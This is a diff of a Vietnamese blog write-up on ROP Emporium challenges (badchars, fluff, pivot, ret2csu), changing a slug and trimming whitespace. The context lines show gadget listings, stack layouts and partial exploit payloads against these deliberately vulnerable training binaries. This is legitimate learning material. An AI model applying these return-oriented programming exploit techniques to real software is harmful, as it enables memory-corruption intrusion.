@@ -2,7 +2,7 @@ Title: Học khai thác lỗ hổng bảo mật qua ROP Emporium - Part 2
 Date: 2023-10-17
 Category: Trang chủ
 Tags: binary, exploit, rop, x64
-Slug: pwn
+Slug: pwn2
 Authors: minix
 
 ## Bad chars
@@ -32,12 +32,12 @@ nth paddr        size vaddr       vsize perm name
 
 $ python3 Ropper.py -f badchars
 ...
-0x000000000040069c: pop r12; pop r13; pop r14; pop r15; ret;  
+0x000000000040069c: pop r12; pop r13; pop r14; pop r15; ret;
 0x00000000004006a3: pop rdi; ret;
 0x00000000004004ee: ret;
 0x0000000000400628: xor byte ptr [r15], r14b; ret;
 0x0000000000400634: mov qword ptr [r13], r12; ret;
-0x00000000004006a2: pop r15; ret; 
+0x00000000004006a2: pop r15; ret;
 ```
 
 Build stack như sau
@@ -83,7 +83,7 @@ for c in filename:
 
 payload = b''
 payload += b'B'*40
-payload += p(0x40069c) # pop r12; pop r13; pop r14; pop r15; ret; 
+payload += p(0x40069c) # pop r12; pop r13; pop r14; pop r15; ret;
 payload += enc_filename.encode() # r12
 payload += p(data_loc_addr) # r13
 payload += p(key) # r14
@@ -123,8 +123,8 @@ nth paddr        size vaddr       vsize perm name
 
 $ python3 Ropper.py -f badchars
 ...
-0x000000000040062a: pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret; 
-0x0000000000400639: stosb byte ptr [rdi], al; ret; 
+0x000000000040062a: pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;
+0x0000000000400639: stosb byte ptr [rdi], al; ret;
 0x0000000000400628: xlatb; ret;
 0x00000000004006a3: pop rdi; ret;
 0x0000000000400295: ret;
@@ -151,7 +151,7 @@ Ta xây dựng stack như sau
 [0x4000] -> rdx -> length bit [8:15] = 0x40 (8 bits = 1 byte)
 [base + index - 0x3ef2 - current_al] -> base + index là vị trí của từng ký tự 'flag.txt' trong binary, ta phải cộng thêm giá trị hiện tại của al vì xlatb sẽ là al := rbx + al và trừ đi 0x3e2f do instruction 'add rcx, 0x3ef2' khi đó al := giá trị tại vị trí của 'flag.txt'
 [0x400628] -> xlatb; ret;
-[0x400639] -> stosb byte ptr [rdi], al; ret; 
+[0x400639] -> stosb byte ptr [rdi], al; ret;
 ----> Sau khi lấy hết ký tự 'flag.txt' vào rdi, ta truyền vào hàm print_file()
 [0x4006a3] -> pop rdi; ret;
 [0x400295] -> ret;
@@ -167,7 +167,7 @@ import sys
 base = 0x400000
 length = 0x4000 #length bits, bit from  15:8 is 0x40 -> 64 bit, 8 byte
 xlatb = 0x0000000000400628 # xlatb; ret;
-bextr = 0x000000000040062a # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret; 
+bextr = 0x000000000040062a # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;
 stosb = 0x0000000000400639 # stosb byte ptr [rdi], al; ret;
 pop_rdi = 0x00000000004006a3 # pop rdi; ret;
 data_section_addrs = 0x00601028
@@ -271,7 +271,7 @@ nth paddr      vaddr      bind   type   size lib name
 10  0x0000096a 0x0000096a GLOBAL FUNC   19       foothold_function
 18  0x00000a81 0x00000a81 GLOBAL FUNC   146      ret2win
 
-$ readelf -r pivot 
+$ readelf -r pivot
 Relocation section '.rela.plt' at offset 0x5c8 contains 9 entries:
   Offset          Info           Type           Sym. Value    Sym. Name + Addend
   ...
@@ -303,7 +303,7 @@ Jump tới got.plt
 ![]({static}/images/ropemporium-2/Pivot/3_image.png)
 
 ```text-plain
-$ readelf -r pivot 
+$ readelf -r pivot
 Relocation section '.rela.plt' at offset 0x5c8 contains 9 entries:
   Offset          Info           Type           Sym. Value    Sym. Name + Addend
   ...
@@ -329,7 +329,7 @@ Ta thấy địa chỉ 0x00007ffff7ffe2c0 nằm trong phần data của ld-linux
 Khi ta call put@plt lần 2, got.plt sẽ trỏ đến put trong ld-linux-x86-64.so
 
 ```text-x-python
-$ readelf -r pivot 
+$ readelf -r pivot
 Relocation section '.rela.plt' at offset 0x5c8 contains 9 entries:
   Offset          Info           Type           Sym. Value    Sym. Name + Addend
   ...
@@ -364,7 +364,7 @@ payload1 += p64(0x601040) # 6: sym.imp.foothold_function (); 0x00400720      ff2
 payload1 += p64(0x4009c0) # 0x00000000004009c0: mov rax, qword ptr [rax]; ret;
 payload1 += p64(0x4007c8) # 0x00000000004007c8: pop rbp; ret;
 payload1 += p64(lib_ret2win_addrs-lib_foothold_addrs) #offset
-payload1 += p64(0x4009c4) # 0x00000000004009c4: add rax, rbp; ret; 
+payload1 += p64(0x4009c4) # 0x00000000004009c4: add rax, rbp; ret;
 payload1 += p64(0x4006b0) # 0x00000000004006b0: call rax;
 p.sendline(payload1)
 ```
@@ -396,7 +396,7 @@ payload1 += p64(0x601040) # 6: sym.imp.foothold_function (); 0x00400720      ff2
 payload1 += p64(0x4009c0) # 0x00000000004009c0: mov rax, qword ptr [rax]; ret;
 payload1 += p64(0x4007c8) # 0x00000000004007c8: pop rbp; ret;
 payload1 += p64(lib_ret2win_addrs-lib_foothold_addrs) #offset
-payload1 += p64(0x4009c4) # 0x00000000004009c4: add rax, rbp; ret; 
+payload1 += p64(0x4009c4) # 0x00000000004009c4: add rax, rbp; ret;
 payload1 += p64(0x4006b0) # 0x00000000004006b0: call rax;
 p.sendline(payload1)
 
@@ -428,7 +428,7 @@ Challenge 8 tương tự Challenge 3 Callme, tuy nhiên ta sẽ sử dụng phư
 Ở đây ta sẽ có 2 Gadget, sử dụng radare2 để disassemble function \_\_libc\_csu\_init\_\_
 
 ```text-plain
- radare2 ret2csu 
+ radare2 ret2csu
 [0x00400520]> aaa
 [0x00400520]> afl
 ...
